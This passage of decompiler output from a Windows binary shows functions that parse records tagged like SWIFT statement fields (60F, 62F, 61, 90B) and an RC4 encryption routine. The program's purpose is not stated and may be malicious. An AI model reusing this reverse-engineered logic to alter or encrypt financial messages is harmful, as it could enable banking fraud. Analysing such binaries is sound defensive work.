  char v58; // [esp+A4h] [ebp-6A0h]
  int v59; // [esp+A5h] [ebp-69Fh]
  int v60; // [esp+A9h] [ebp-69Bh]
  int v61; // [esp+ADh] [ebp-697h]
  __int16 v62; // [esp+B1h] [ebp-693h]
  char v63; // [esp+B3h] [ebp-691h]
  int v64; // [esp+B4h] [ebp-690h]
  char v65; // [esp+B8h] [ebp-68Ch]
  int v66; // [esp+B9h] [ebp-68Bh]
  int v67; // [esp+BDh] [ebp-687h]
  int v68; // [esp+C1h] [ebp-683h]
  __int16 v69; // [esp+C5h] [ebp-67Fh]
  char v70; // [esp+C7h] [ebp-67Dh]
  int v71; // [esp+C8h] [ebp-67Ch]
  __int16 v72; // [esp+CCh] [ebp-678h]
  char v73; // [esp+CEh] [ebp-676h]
  int v74; // [esp+CFh] [ebp-675h]
  int v75; // [esp+D3h] [ebp-671h]
  int v76; // [esp+D7h] [ebp-66Dh]
  char v77; // [esp+DBh] [ebp-669h]
  int v78; // [esp+DCh] [ebp-668h]
  int v79; // [esp+E0h] [ebp-664h]
  __int16 v80; // [esp+E4h] [ebp-660h]
  int v81; // [esp+E6h] [ebp-65Eh]
  int v82; // [esp+EAh] [ebp-65Ah]
  __int16 v83; // [esp+EEh] [ebp-656h]
  int v84; // [esp+F0h] [ebp-654h]
  int v85; // [esp+F4h] [ebp-650h]
  int v86; // [esp+F8h] [ebp-64Ch]
  int v87; // [esp+FCh] [ebp-648h]
  int v88; // [esp+100h] [ebp-644h]
  int v89; // [esp+104h] [ebp-640h]
  int v90; // [esp+108h] [ebp-63Ch]
  char v91; // [esp+10Ch] [ebp-638h]
  int v92; // [esp+10Dh] [ebp-637h]
  int v93; // [esp+111h] [ebp-633h]
  __int16 v94; // [esp+115h] [ebp-62Fh]
  char v95; // [esp+117h] [ebp-62Dh]
  int v96; // [esp+118h] [ebp-62Ch]
  int v97; // [esp+11Ch] [ebp-628h]
  char v98; // [esp+120h] [ebp-624h]
  int v99; // [esp+121h] [ebp-623h]
  int v100; // [esp+125h] [ebp-61Fh]
  __int16 v101; // [esp+129h] [ebp-61Bh]
  char v102; // [esp+12Bh] [ebp-619h]
  CHAR psz; // [esp+12Ch] [ebp-618h]
  char v104; // [esp+12Dh] [ebp-617h]
  __int16 v105; // [esp+22Dh] [ebp-517h]
  char v106; // [esp+22Fh] [ebp-515h]
  char v107; // [esp+230h] [ebp-514h]
  char v108; // [esp+231h] [ebp-513h]
  __int16 v109; // [esp+331h] [ebp-413h]
  char v110; // [esp+333h] [ebp-411h]
  CHAR v111; // [esp+334h] [ebp-410h]
  char v112; // [esp+335h] [ebp-40Fh]
  char v113; // [esp+438h] [ebp-30Ch]
  char v114; // [esp+53Ch] [ebp-208h]
  char v115; // [esp+53Fh] [ebp-205h]
  char v116; // [esp+641h] [ebp-103h]
  __int16 v117; // [esp+741h] [ebp-3h]
  char v118; // [esp+743h] [ebp-1h]

  v111 = 0;
  memset(&v112, 0, 0x40Cu);
  v117 = 0;
  v118 = 0;
  psz = 0;
  memset(&v104, 0, 0x100u);
  v105 = 0;
  v106 = 0;
  v107 = 0;
  memset(&v108, 0, 0x100u);
  v109 = 0;
  v110 = 0;
  v19 = 0;
  v23 = 0;
  v20 = 0;
  v24 = 0;
  v21 = 0;
  Str1 = 0;
  strcpy(Str2, "January");
  v33 = dword_40FE9C;
  v25 = 0;
  v15 = 0;
  v36 = 0;
  v26 = 0;
  v16 = 0;
  v37 = 0;
  v27 = 0;
  v17 = 0;
  v30 = 0;
  v38 = 0;
  v28 = 0;
  v14 = 0;
  v31 = 0;
  v39 = 0;
  v42 = 0;
  v32 = 0;
  v43 = 0;
  v34 = dword_40FEA0;
  v35 = byte_40FEA4;
  v44 = 0;
  v45 = 0;
  v40 = dword_40FE94;
  v41 = word_40FE98;
  v48 = 0;
  v49 = 0;
  v46 = dword_40FE8C;
  v47 = word_40FE90;
  v50 = 0;
  v18 = 0;
  v51 = 0;
  v52 = dword_40FE88;
  v53 = 0;
  v54 = 0;
  v55 = 0;
  v56 = 0;
  v59 = 0;
  v60 = 0;
  v57 = dword_40FE80;
  v61 = 0;
  v62 = 0;
  v64 = dword_40FE78;
  v63 = 0;
  v66 = 0;
  v71 = dword_40FE70;
  v67 = 0;
  v68 = 0;
  v58 = byte_40FE84;
  v74 = 0;
  v69 = 0;
  v75 = 0;
  v65 = byte_40FE7C;
  v70 = 0;
  v76 = 0;
  v72 = word_40FE74;
  v73 = byte_40FE76;
  v77 = 0;
  v78 = dword_40FE64;
  v79 = dword_40FE68;
  v80 = word_40FE6C;
  v84 = dword_40FE5C;
  v81 = 0;
  v85 = dword_40FE60;
  v82 = 0;
  v89 = dword_40FE50;
  v90 = dword_40FE54;
  v83 = 0;
  v86 = 0;
  v92 = 0;
  v96 = dword_40FE44;
  v87 = 0;
  v93 = 0;
  v88 = 0;
  v99 = 0;
  v94 = 0;
  v100 = 0;
  v91 = byte_40FE58;
  v95 = 0;
  v101 = 0;
  v97 = dword_40FE48;
  v98 = byte_40FE4C;
  v102 = 0;
  v5 = 0;
  v6 = &v111;
  while ( 1 )
  {
    v7 = sub_40A5A0(a1, *a2, &psz, 260);
    *a2 = v7;
    if ( v7 <= 0 )
      break;
    StrTrimA(&psz, asc_40FE04);
    if ( sub_40A830(&psz, asc_40FE40, 1, v6, 260) )
      break;
    StrTrimA(v6, asc_40FE04);
    ++v5;
    v6 += 260;
    if ( v5 >= 4 )
    {
      if ( !sub_40A830(&v113, asc_40FE04, 0, &v18, 10)
        && !sub_40A830(&v113, asc_40FE04, 1, &Str1, 20)
        && !sub_40A830(&v113, asc_40FE04, 2, &v14, 10) )
      {
        v115 = 0;
        v8 = sub_40A6D0(&v116);
        sub_40A7A0(v8, SHIDWORD(v8), &v107, 260);
        v9 = 0;
        v10 = Str2;
        do
        {
          if ( !stricmp(&Str1, v10) )
            break;
          ++v9;
          v10 += 20;
        }
        while ( v9 < 0xB );
        if ( v9 != 12 )
        {
          v11 = strstr(Str, SubStr);
          if ( v11 )
          {
            *v11 = 0;
            v12 = stricmp(&v111, aCredit);
            snprintf(
              Dest,
              a5 - 1,
              aSCS2dSSS,
              Str,
              (char)((v12 != 0) + 67),
              (char *)&v15 + 1,
              v9 + 1,
              &v18,
              &v114,
              &v107);
            return 0;
          }
        }
      }
      return -1;
    }
  }
  return -1;
}
// 40FE44: using guessed type int dword_40FE44;
// 40FE48: using guessed type int dword_40FE48;
// 40FE4C: using guessed type char byte_40FE4C;
// 40FE50: using guessed type int dword_40FE50;
// 40FE54: using guessed type int dword_40FE54;
// 40FE58: using guessed type char byte_40FE58;
// 40FE5C: using guessed type int dword_40FE5C;
// 40FE60: using guessed type int dword_40FE60;
// 40FE64: using guessed type int dword_40FE64;
// 40FE68: using guessed type int dword_40FE68;
// 40FE6C: using guessed type __int16 word_40FE6C;
// 40FE70: using guessed type int dword_40FE70;
// 40FE74: using guessed type __int16 word_40FE74;
// 40FE76: using guessed type char byte_40FE76;
// 40FE78: using guessed type int dword_40FE78;
// 40FE7C: using guessed type char byte_40FE7C;
// 40FE80: using guessed type int dword_40FE80;
// 40FE84: using guessed type char byte_40FE84;
// 40FE88: using guessed type int dword_40FE88;
// 40FE8C: using guessed type int dword_40FE8C;
// 40FE90: using guessed type __int16 word_40FE90;
// 40FE94: using guessed type int dword_40FE94;
// 40FE98: using guessed type __int16 word_40FE98;
// 40FE9C: using guessed type int dword_40FE9C;
// 40FEA0: using guessed type int dword_40FEA0;
// 40FEA4: using guessed type char byte_40FEA4;

//----- (0040B280) --------------------------------------------------------
signed int __cdecl sub_40B280(int a1, int *a2, char *Str, char *a4, int a5)
{
  int v5; // ecx
  signed int v6; // eax
  signed int v8; // eax
  int v9; // ST10_4
  signed int v10; // eax
  __int16 *v11; // edx
  __int64 v12; // rax
  char *v13; // eax
  _BYTE v14[3]; // [esp+Dh] [ebp-413h]
  __int16 v15; // [esp+Eh] [ebp-412h]
  char v16; // [esp+Fh] [ebp-411h]
  char Dest; // [esp+10h] [ebp-410h]
  char v18; // [esp+11h] [ebp-40Fh]
  __int16 v19; // [esp+111h] [ebp-30Fh]
  char v20; // [esp+113h] [ebp-30Dh]
  CHAR Source; // [esp+114h] [ebp-30Ch]
  char v22; // [esp+115h] [ebp-30Bh]
  __int16 v23; // [esp+215h] [ebp-20Bh]
  char v24; // [esp+217h] [ebp-209h]
  CHAR v25; // [esp+218h] [ebp-208h]
  char v26; // [esp+219h] [ebp-207h]
  char v27; // [esp+21Bh] [ebp-205h]
  __int16 v28; // [esp+319h] [ebp-107h]
  char v29; // [esp+31Bh] [ebp-105h]
  CHAR psz; // [esp+31Ch] [ebp-104h]
  char v31; // [esp+31Dh] [ebp-103h]
  __int16 v32; // [esp+41Dh] [ebp-3h]
  char v33; // [esp+41Fh] [ebp-1h]

  psz = 0;
  v25 = 0;
  memset(&v31, 0, 0x100u);
  v32 = 0;
  v33 = 0;
  Dest = 0;
  memset(&v26, 0, 0x100u);
  v28 = 0;
  v29 = 0;
  Source = 0;
  memset(&v18, 0, 0x100u);
  v19 = 0;
  v20 = 0;
  memset(&v22, 0, 0x100u);
  v5 = *a2;
  v23 = 0;
  v24 = 0;
  v6 = sub_40A5A0(a1, v5, &psz, 260);
  *a2 = v6;
  if ( v6 <= 0 )
    return -1;
  StrTrimA(&psz, asc_40FE04);
  v8 = sub_40A5A0(a1, *a2, &Source, 260);
  *a2 = v8;
  if ( v8 <= 0 )
    return -1;
  StrTrimA(&Source, asc_40FE04);
  if ( sub_40A830(&Source, asc_40FE40, 1, &v25, 260) )
    return -1;
  StrTrimA(&v25, asc_40FE04);
  v9 = *a2;
  v27 = 0;
  v10 = sub_40A5A0(a1, v9, &Source, 260);
  *a2 = v10;
  if ( v10 <= 0 )
    return -1;
  StrTrimA(&Source, asc_40FE04);
  if ( sub_40A830(&Source, asc_40FE40, 1, &Dest, 260) )
    strncpy(&Dest, &Source, 0x103u);
  StrTrimA(&Dest, asc_40FE24);
  if ( *(&v16 + strlen(&Dest)) == 44 )
  {
    *(&v16 + strlen(&Dest)) = 46;
  }
  else
  {
    v11 = &v15;
    if ( *((_BYTE *)&v15 + strlen(&Dest)) == 44 || (v11 = (__int16 *)v14, v14[strlen(&Dest)] == 44) )
      *((_BYTE *)v11 + strlen(&Dest)) = 46;
  }
  v12 = sub_40A6D0(&Dest);
  sub_40A7A0(v12, SHIDWORD(v12), &Dest, 260);
  v13 = strstr(Str, SubStr);
  if ( !v13 )
    return -1;
  *v13 = 0;
  snprintf(a4, a5 - 1, aSSSS, Str, &psz, &v25, &Dest);
  return 0;
}

//----- (0040B550) --------------------------------------------------------
signed int __cdecl sub_40B550(int a1, int *a2, char *Str, char *Dest, int a5)
{
  int v5; // ecx
  signed int v6; // eax
  signed int v8; // eax
  __int64 v9; // rax
  char *v10; // eax
  CHAR v11; // [esp+Ch] [ebp-30Ch]
  char v12; // [esp+Dh] [ebp-30Bh]
  __int16 v13; // [esp+10Dh] [ebp-20Bh]
  char v14; // [esp+10Fh] [ebp-209h]
  CHAR v15; // [esp+110h] [ebp-208h]
  char v16; // [esp+111h] [ebp-207h]
  __int16 v17; // [esp+211h] [ebp-107h]
  char v18; // [esp+213h] [ebp-105h]
  CHAR psz; // [esp+214h] [ebp-104h]
  char v20; // [esp+215h] [ebp-103h]
  __int16 v21; // [esp+315h] [ebp-3h]
  char v22; // [esp+317h] [ebp-1h]

  psz = 0;
  v11 = 0;
  memset(&v20, 0, 0x100u);
  v21 = 0;
  v22 = 0;
  v15 = 0;
  memset(&v12, 0, 0x100u);
  v13 = 0;
  v14 = 0;
  memset(&v16, 0, 0x100u);
  v5 = *a2;
  v17 = 0;
  v18 = 0;
  v6 = sub_40A5A0(a1, v5, &psz, 260);
  *a2 = v6;
  if ( v6 <= 0 )
    return -1;
  StrTrimA(&psz, asc_40FE04);
  v8 = sub_40A5A0(a1, *a2, &v15, 260);
  *a2 = v8;
  if ( v8 <= 0 )
    return -1;
  StrTrimA(&v15, asc_40FE04);
  if ( sub_40A830(&v15, asc_40FE40, 1, &v11, 260) )
    return -1;
  StrTrimA(&v11, asc_40FE24);
  v9 = sub_40A6D0(&v11);
  sub_40A7A0(v9, SHIDWORD(v9), &v11, 260);
  v10 = strstr(Str, SubStr);
  if ( !v10 )
    return -1;
  *v10 = 0;
  snprintf(Dest, a5 - 1, aSSS_0, Str, &psz, &v11);
  return 0;
}

//----- (0040B6F0) --------------------------------------------------------
int __cdecl sub_40B6F0(char *Source, char *Dest, int a3)
{
  size_t v3; // esi
  unsigned int v4; // kr04_4
  void *v5; // ebp
  int v7; // [esp+10h] [ebp-1010Ch]
  int v8; // [esp+14h] [ebp-10108h]
  CHAR psz; // [esp+18h] [ebp-10104h]
  char v10; // [esp+19h] [ebp-10103h]
  __int16 v11; // [esp+119h] [ebp-10003h]
  char v12; // [esp+11Bh] [ebp-10001h]
  char v13; // [esp+11Ch] [ebp-10000h]
  char v14; // [esp+11Dh] [ebp-FFFFh]
  __int16 v15; // [esp+10119h] [ebp-3h]
  char v16; // [esp+1011Bh] [ebp-1h]

  psz = 0;
  memset(&v10, 0, 0x100u);
  v11 = 0;
  v12 = 0;
  v13 = 0;
  memset(&v14, 0, 0xFFFCu);
  v15 = 0;
  v16 = 0;
  memset(Dest, 0, a3);
  v8 = 0;
  v7 = 0;
  sprintf(Dest, asc_40FEFC);
  if ( !Source || !*Source )
    return -1;
  v4 = strlen(Source) + 1;
  v3 = v4 - 1 + 10;
  v5 = malloc(v3);
  if ( !v5 )
  {
    GetLastError();
    return -1;
  }
  memset(v5, 0, v3);
  strncpy((char *)v5, Source, v4 - 1 + 9);
  StrTrimA((LPSTR)v5, asc_40FEFC);
  strncat((char *)v5, ::Source, v3 - (strlen((const char *)v5) + 1));
  while ( 1 )
  {
    v7 = sub_40A5A0((int)v5, v7, &psz, 260);
    if ( v7 <= 0 )
      break;
    StrTrimA(&psz, asc_40FE04);
    if ( psz )
    {
      memset(&v13, 0, 0x10000u);
      if ( !strnicmp(&psz, a60f, 5u)
        || !strnicmp(&psz, a60m, 5u)
        || !strnicmp(&psz, a62f, 5u)
        || !strnicmp(&psz, a62m, 5u)
        || !strnicmp(&psz, a64_0, 4u)
        || !strnicmp(&psz, a65, 4u) )
      {
        if ( sub_40AD70((int)v5, &v7, &psz, &v13, 0x10000) )
        {
LABEL_30:
          GetLastError();
          v8 = -1;
          break;
        }
LABEL_29:
        snprintf(&Dest[strlen(Dest)], a3 - (strlen(Dest) + 1), aS_1, &v13);
      }
      else
      {
        if ( !strnicmp(&psz, a61, 4u) )
        {
          if ( sub_40A9A0((int)v5, &v7, (int)&psz, &v13, 0x10000) )
            goto LABEL_30;
          goto LABEL_29;
        }
        if ( !strnicmp(&psz, a90b, 5u) || !strnicmp(&psz, a19a, 5u) )
        {
          if ( sub_40B280((int)v5, &v7, &psz, &v13, 0x10000) )
            goto LABEL_30;
          goto LABEL_29;
        }
        if ( !strnicmp(&psz, a36b, 5u) )
        {
          if ( sub_40B550((int)v5, &v7, &psz, &v13, 0x10000) )
            goto LABEL_30;
          goto LABEL_29;
        }
        if ( strstr(&psz, SubStr) )
        {
          if ( sub_40A8D0((int)v5, (int)&v7, &psz, &v13, 0x10000) )
            goto LABEL_30;
          goto LABEL_29;
        }
      }
    }
  }
  free(v5);
  Dest[strlen(Dest) - 2] = 0;
  return v8;
}

//----- (0040BAB0) --------------------------------------------------------
_BYTE *__cdecl sub_40BAB0(int a1, int a2, int a3)
{
  int v3; // esi
  signed int v4; // ecx
  signed int v5; // eax
  char v6; // bl
  _BYTE *result; // eax
  unsigned __int8 v8; // [esp+14h] [ebp+4h]

  v3 = a1;
  v4 = 0;
  v5 = 0;
  do
  {
    *(_BYTE *)(v5 + a1) = v5;
    ++v5;
  }
  while ( v5 < 256 );
  *(_BYTE *)(a1 + 256) = 0;
  *(_BYTE *)(a1 + 257) = 0;
  v8 = 0;
  do
  {
    v6 = *(_BYTE *)(v4 + v3);
    v8 += v6 + *(_BYTE *)(v4 % a3 + a2);
    result = (_BYTE *)(v3 + v8);
    *(_BYTE *)(++v4 + v3 - 1) = *result;
    *result = v6;
  }
  while ( v4 < 256 );
  return result;
}

//----- (0040BB20) --------------------------------------------------------
void __cdecl sub_40BB20(int a1, int a2, _BYTE *a3, int a4)
{
  _BYTE *v4; // esi
  unsigned __int8 v5; // bl
  int v6; // ecx
  _BYTE *v7; // edx
  unsigned __int8 v8; // bl
  _BYTE *v9; // edi

  if ( a4 > 0 )
  {
    v4 = a3;
    do
    {
      v5 = *(_BYTE *)(a1 + 256) + 1;
      *(_BYTE *)(a1 + 256) = v5;
      v6 = v5;
      v7 = (_BYTE *)(v5 + a1);
      v8 = *v7 + *(_BYTE *)(a1 + 257);
      *(_BYTE *)(a1 + 257) = v8;
      v9 = (_BYTE *)(a1 + v8);
      LOBYTE(v6) = *(_BYTE *)(v6 + a1);
      *v7 = *v9;
      *v9 = v6;
      *v4 = v4[a2 - (_DWORD)a3] ^ *(_BYTE *)((unsigned __int8)(*(_BYTE *)(*(unsigned __int8 *)(a1 + 256) + a1)
                                                             + *(_BYTE *)(*(unsigned __int8 *)(a1 + 257) + a1))
                                           + a1);
      ++v4;
      --a4;
    }
    while ( a4 );
  }
}

//----- (0040BBC0) --------------------------------------------------------
void __cdecl sub_40BBC0(int a1, int a2, _BYTE *a3, int a4)
{
  char v4; // [esp+4h] [ebp-104h]
  char v5; // [esp+5h] [ebp-103h]
  char v6; // [esp+105h] [ebp-3h]

  v4 = 0;
  memset(&v5, 0, 0x100u);
  v6 = 0;
  sub_40BAB0((int)&v4, a1, a2);
  sub_40BB20((int)&v4, (int)a3, a3, a4);
}

//----- (0040BC56) --------------------------------------------------------
void __cdecl sub_40BC56(void *Memory)
{
  free(Memory);
}

//----- (0040BFD4) --------------------------------------------------------
int sub_40BFD4()
{
  return 0;
}

//----- (0040BFFC) --------------------------------------------------------
int SEH_402E80()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C019) --------------------------------------------------------
int SEH_403020()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C03C) --------------------------------------------------------
int SEH_403800()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C062) --------------------------------------------------------
int SEH_403CD0()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C07C) --------------------------------------------------------
int SEH_404410()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C099) --------------------------------------------------------
int SEH_4045C0()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C134) --------------------------------------------------------
int SEH_404800()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C15B) --------------------------------------------------------
int SEH_4054F0()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C179) --------------------------------------------------------
int SEH_405A30()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C19C) --------------------------------------------------------
int SEH_405BE0()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C1BC) --------------------------------------------------------
int SEH_406050()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C1DC) --------------------------------------------------------
int SEH_406490()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C202) --------------------------------------------------------
int SEH_406810()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C219) --------------------------------------------------------
int SEH_406B40()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C2ED) --------------------------------------------------------
int SEH_406D80()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C30C) --------------------------------------------------------
int SEH_408550()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C338) --------------------------------------------------------
int SEH_4086E0()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

//----- (0040C361) --------------------------------------------------------
int SEH_40A2E0()
{
  return _CxxFrameHandler();
}
// 40BE98: using guessed type int _CxxFrameHandler(void);

// ALL OK, 128 function(s) have been successfully decompiled
